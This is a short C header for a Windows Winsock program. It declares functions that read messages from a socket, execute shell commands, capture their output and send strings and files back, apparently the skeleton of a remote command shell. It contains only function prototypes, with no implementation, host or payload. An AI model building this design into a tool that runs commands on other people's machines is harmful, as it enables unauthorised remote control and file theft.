#ifndef SHELL_COMM_HEADER
#define SHELL_COMM_HEADER

#include <ws2tcpip.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")

int comm(SOCKET sock, int BUF_SIZE, int REPLY_MAX_SIZE);

FILE* processMsg(char * msg, char * cwd, int * replyType);

FILE* processShellCmd(char * cmd, char * cwd, int * replyType);

FILE* processExtCmd(char * cmd, char * cwd, int * replyType);

FILE* getCmdOut(char * cmd);

char* getCmdOutStr(char * cmd, int REPLY_MAX_SIZE);

FILE* getTempFile(char * string);

void sendString(SOCKET sock, FILE *file, int REPLY_MAX_SIZE);

void sendFile(SOCKET sock, FILE *file, int REPLY_MAX_SIZE);

#endif
